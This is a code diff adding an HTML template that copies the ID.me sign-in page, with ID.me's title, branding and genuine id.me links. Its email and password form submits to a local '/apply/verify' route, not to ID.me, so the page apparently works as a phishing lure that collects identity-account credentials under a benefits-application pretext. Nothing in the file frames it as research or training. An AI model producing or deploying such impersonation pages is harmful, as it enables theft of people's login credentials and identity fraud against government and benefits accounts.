@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Sign in to ID.me - ID.me</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="/public/idme-signin.css" />
+</head>
+<body>
+  <div class="page-container">
+    <header class="form-header">
+      <div class="form-header-content" role="banner">
+        <div class="partner" style="display: flex; flex-direction: column; align-items: center;">
+          <div class="company-logo" style="margin-bottom:18px;">
+            <img alt="Your Company Logo" class="img-lightmode" src="/public/img/logo.jpg" style="max-height:54px;">
+          </div>
+        </div>
+      </div>
+    </header>
+    <main class="form-container">
+      <div class="form-header-access">
+        <h1 id="sr_page_title">Sign in to ID.me</h1>
+      </div>
+      <div class="form-header-well">
+        <p><b>New to ID.me?</b></p>
+        <p>
+          <a href="https://api.id.me/en/registration/new" target="_blank">Create an ID.me account</a>
+        </p>
+      </div>
+      <form class="idme-form" method="post" action="/apply/verify" autocomplete="off">
+        <div class="form-fields">
+          <div class="field text">
+            <label for="idme-email">Email</label>
+            <input id="idme-email" type="email" name="email" required autocomplete="off" placeholder="your@email.com" value="<%= email %>">
+          </div>
+          <div class="field text password-showable signin-password-field">
+            <label for="idme-password">Password</label>
+            <input id="idme-password" type="password" name="password" required autocomplete="off" placeholder="Enter your password">
+          </div>
+        </div>
+        <div class="forgot-password-link">
+          <a href="https://api.id.me/en/passwords/new" target="_blank">Forgot password?</a>
+        </div>
+        <div class="form-actions">
+          <button type="submit" class="btn-primary">Sign in</button>
+        </div>
+        <div class="form-footer-message">
+          <p>Social media sign-in is no longer available. Please sign in with your email.</p>
+        </div>
+      </form>
+      <aside class="language-selection">
+        <a class="language-selection-toggle" href="#">English</a>
+        <!-- You can add a dropdown or modal for more languages if needed -->
+      </aside>
+      <footer class="footer">
+        <nav class="footer__links" aria-label="Footer">
+          <a href="https://www.id.me/about" target="_blank" class="footer__link">What is ID.me?</a>
+          <a href="https://www.id.me/terms" target="_blank" class="footer__link">Terms of Service</a>
+          <a href="https://www.id.me/privacy" target="_blank" class="footer__link">Privacy Policy</a>
+        </nav>
+      </footer>
+    </main>
+  </div>
+</body>
+</html>
